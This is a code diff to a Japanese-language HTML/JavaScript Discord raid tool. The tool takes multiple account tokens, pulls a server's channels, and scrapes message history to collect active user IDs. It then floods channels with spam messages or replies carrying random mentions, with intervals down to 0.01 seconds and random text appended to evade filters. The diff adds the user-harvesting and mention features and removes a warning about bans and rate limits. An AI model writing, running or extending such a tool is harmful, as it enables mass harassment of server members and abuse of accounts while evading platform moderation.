@@ -50,7 +50,6 @@
         .mode-btn { flex: 1; padding: 10px; background: #111; color: #555; border: 1px solid #333; text-align: center; cursor: pointer; font-size: 12px; border-radius: 4px; }
         .mode-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(0, 212, 255, 0.1); }
 
-        /* 超高速設定セクション */
         .delay-control {
             background: rgba(255, 0, 85, 0.1); padding: 15px; border-radius: 4px; border: 1px solid var(--danger); margin-bottom: 15px;
             box-shadow: 0 0 15px rgba(255, 0, 85, 0.2);
@@ -63,6 +62,15 @@
         .status-val { color: var(--accent); font-weight: bold; }
 
         #log { margin-top: 15px; height: 150px; background: #000; border: 1px solid var(--border); padding: 10px; font-size: 11px; overflow-y: auto; color: #666; }
+        
+        /* メンションスイッチ */
+        .toggle-container { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; background: #1a1a2a; padding: 10px; border-radius: 4px; }
+        .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .4s; border-radius: 20px; }
+        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--accent); }
+        input:checked + .slider:before { transform: translateX(20px); }
     </style>
 </head>
 <body>
@@ -81,7 +89,7 @@
         <div class="flex-1">
             <label>ターゲットサーバーID</label>
             <input type="text" id="guildId">
-            <button class="btn" style="background:#1a1a2a; color:var(--accent); font-size:10px; margin-top:5px; padding:5px; width:100%;" onclick="fetchData()">データ同期</button>
+            <button class="btn" style="background:#1a1a2a; color:var(--accent); font-size:10px; margin-top:5px; padding:5px; width:100%;" onclick="fetchServerInfo()">サーバー情報を取得</button>
         </div>
         <div style="width: 140px;">
             <label>遡り/送信数</label>
@@ -90,34 +98,43 @@
     </div>
 
     <div class="delay-control">
-        <label style="color: var(--danger); letter-spacing: 2px;">送信制限 (秒) - 最小 0.01</label>
-        <div style="display: flex; align-items: center; gap: 15px;">
-            <input type="range" id="delayRange" min="0" max="3" step="0.01" value="0.5" style="accent-color: var(--danger);" 
-                   oninput="document.getElementById('delayNum').value = this.value">
-            <div style="display: flex; align-items: center; gap: 5px;">
-                <input type="number" id="delayNum" value="0.5" step="0.01" min="0" style="width: 80px; text-align: center; color: var(--danger); font-weight: bold;" 
-                       oninput="document.getElementById('delayRange').value = this.value">
-                <span style="font-size: 12px; color: var(--danger);">秒</span>
-            </div>
+        <label style="color: var(--danger); letter-spacing: 2px;">送信間隔 (秒) - 最小 0.01</label>
+        <div style="display: flex; align-items: center; gap: 10px;">
+            <input type="number" id="delayNum" value="0.5" step="0.01" min="0.01" 
+                   style="width: 100%; text-align: center; color: var(--danger); font-weight: bold; font-size: 16px;">
+            <span style="font-size: 14px; color: var(--danger); font-weight: bold;">秒</span>
         </div>
-        <p style="font-size: 9px; color: #ff8888; margin-top: 5px; margin-bottom: 0;">※ 0秒（0.01秒）設定はトークンBANおよびレート制限のリスクが極めて高いです。</p>
     </div>
 
     <div class="flex-row">
-        <textarea class="flex-1" id="channels" style="height: 60px;" placeholder="チャンネルIDリスト"></textarea>
-        <textarea class="flex-1" id="members" style="height: 60px;" placeholder="メンバーIDリスト"></textarea>
+        <div class="flex-1">
+            <label>チャンネルIDリスト</label>
+            <textarea id="channels" style="height: 60px;" placeholder="取得されたチャンネル"></textarea>
+        </div>
+        <div class="flex-1">
+            <label>アクティブユーザーIDリスト (自動抽出)</label>
+            <textarea id="members" style="height: 60px;" placeholder="発言履歴のあるユーザー"></textarea>
+        </div>
+    </div>
+
+    <div class="toggle-container">
+        <span style="font-size: 12px; color: var(--accent); font-weight: bold;">ランダムメンション</span>
+        <label class="switch">
+            <input type="checkbox" id="mentionToggle" checked>
+            <span class="slider"></span>
+        </label>
     </div>
 
     <label>攻撃モード</label>
     <div class="mode-panel">
-        <div id="modeNormal" class="mode-btn" onclick="setMode('normal')">通常爆撃</div>
-        <div id="modeReply" class="mode-btn active" onclick="setMode('reply')">既存メッセージへリプライ</div>
+        <div id="modeNormal" class="mode-btn active" onclick="setMode('normal')">通常爆撃</div>
+        <div id="modeReply" class="mode-btn" onclick="setMode('reply')">既存メッセージへリプライ</div>
     </div>
 
     <div class="flex-row" style="align-items: flex-end;">
         <div class="flex-1">
-            <label>送信メッセージ (手動入力必須)</label>
-            <input type="text" id="msgBody" placeholder="空欄では送信できません" value="">
+            <label>送信メッセージ</label>
+            <input type="text" id="msgBody" placeholder="メッセージ内容">
         </div>
         <div style="width: 160px;">
             <label>ランダム回避言語</label>
@@ -135,13 +152,13 @@
     </div>
 
     <div class="status-bar">
-        <div>MODE: <span id="currentModeDisplay" class="status-val">REPLY</span></div>
+        <div>MODE: <span id="currentModeDisplay" class="status-val">NORMAL</span></div>
         <div>SENT: <span id="sentCount" class="status-val">0</span></div>
         <div>STATUS: <span id="statusText" class="status-val">READY</span></div>
     </div>
 
     <div class="flex-row">
-        <button id="start" class="btn btn-main flex-1" onclick="execute()">RAID OVERDRIVE 起動</button>
+        <button id="start" class="btn btn-main flex-1" onclick="execute()">スパムを開始</button>
         <button id="stop" class="btn btn-stop" onclick="stop()" disabled>停止</button>
     </div>
 
@@ -150,7 +167,7 @@
 
 <script>
     let sweeping = false;
-    let attackMode = 'reply';
+    let attackMode = 'normal';
     let sentCount = 0;
 
     const charSets = {
@@ -178,19 +195,37 @@
         document.getElementById('currentModeDisplay').innerText = mode.toUpperCase();
     }
 
-    async function fetchData() {
+    async function fetchServerInfo() {
         const t = document.getElementById('tokens').value.split('\n')[0].trim();
         const g = document.getElementById('guildId').value.trim();
-        if(!t || !g) return alert("同期には有効なトークン1枚とサーバーIDが必要です");
+        const limit = parseInt(document.getElementById('limit').value) || 50;
+
+        if(!t || !g) return alert("情報を取得するにはトークン1枚とサーバーIDが必要です");
+
         try {
+            log("サーバー情報取得中...");
             const rC = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { 'Authorization': t } });
-            const data = await rC.json();
-            document.getElementById('channels').value = data.filter(c => [0,5].includes(c.type)).map(c => c.id).join('\n');
-            const rM = await fetch(`https://discord.com/api/v9/guilds/${g}/members?limit=1000`, { headers: { 'Authorization': t } });
-            const mData = await rM.json();
-            document.getElementById('members').value = mData.map(m => m.user.id).join('\n');
-            log("同期成功。");
-        } catch(e) { log("同期失敗。"); }
+            const channels = await rC.json();
+            const textChannels = channels.filter(c => [0,5].includes(c.type));
+            document.getElementById('channels').value = textChannels.map(c => c.id).join('\n');
+
+            let userSet = new Set();
+            log(`${textChannels.length}個のチャンネルから発言ユーザーを抽出中...`);
+
+            // 各チャンネルの最新メッセージからユーザーIDを取得
+            for(const ch of textChannels.slice(0, 10)) { // 負荷軽減のため上位10件のチャンネルを優先調査
+                const rM = await fetch(`https://discord.com/api/v9/channels/${ch.id}/messages?limit=${limit}`, { headers: { 'Authorization': t } });
+                const msgs = await rM.json();
+                if(Array.isArray(msgs)) {
+                    msgs.forEach(m => userSet.add(m.author.id));
+                }
+            }
+
+            document.getElementById('members').value = Array.from(userSet).join('\n');
+            log(`取得完了: ${textChannels.length}件のチャンネル, ${userSet.size}名の発言者`);
+        } catch(e) { 
+            log("取得失敗。トークンや権限を確認してください。"); 
+        }
     }
 
     function getRand() {
@@ -207,19 +242,19 @@
         sweeping = true;
         document.getElementById('start').disabled = true;
         document.getElementById('stop').disabled = false;
-        document.getElementById('statusText').innerText = "OVERDRIVE";
+        document.getElementById('statusText').innerText = "RUNNING";
         
         const tokens = document.getElementById('tokens').value.split('\n').filter(x => x.trim());
         const channels = document.getElementById('channels').value.split('\n').filter(x => x.trim());
         const members = document.getElementById('members').value.split('\n').filter(x => x.trim());
         const limit = parseInt(document.getElementById('limit').value);
+        const isMention = document.getElementById('mentionToggle').checked;
         
-        // 0秒指定でも内部的には最小10ms(0.01s)を確保
         let delaySec = parseFloat(document.getElementById('delayNum').value);
         if (delaySec < 0.01) delaySec = 0.01;
         const delayMs = delaySec * 1000;
 
-        log(`攻撃開始 (間隔: ${delaySec}s)`);
+        log("スパム開始");
 
         for (const chId of channels) {
             if (!sweeping) break;
@@ -232,7 +267,7 @@
                     if (Array.isArray(msgs)) {
                         for (const m of msgs) {
                             if (!sweeping) break;
-                            await sendMsg(tokens, chId, m.id, members, msg);
+                            await sendMsg(tokens, chId, m.id, members, msg, isMention);
                             await new Promise(r => setTimeout(r, delayMs));
                         }
                     }
@@ -240,7 +275,7 @@
             } else {
                 for (let i = 0; i < limit; i++) {
                     if (!sweeping) break;
-                    await sendMsg(tokens, chId, null, members, msg);
+                    await sendMsg(tokens, chId, null, members, msg, isMention);
                     await new Promise(r => setTimeout(r, delayMs));
                 }
             }
@@ -248,14 +283,22 @@
         stop();
     }
 
-    async function sendMsg(tokens, chId, replyId, members, msg) {
+    async function sendMsg(tokens, chId, replyId, members, msg, isMention) {
         const token = tokens[Math.floor(Math.random() * tokens.length)];
-        let mentions = members.sort(() => 0.5 - Math.random()).slice(0, 3).map(id => `<@${id}>`).join(" ");
-        const payload = { content: `${mentions} ${msg}\n# ${getRand()}` };
+        
+        let content = msg;
+        if (isMention && members.length > 0) {
+            const randomUser = members[Math.floor(Math.random() * members.length)];
+            content = `<@${randomUser}> ${msg}`;
+        }
+
+        const payload = { content: `${content}\n# ${getRand()}` };
+        
         if (replyId) {
             payload.message_reference = { message_id: replyId };
             payload.allowed_mentions = { replied_user: true };
         }
+
         try {
             fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
                 method: 'POST',
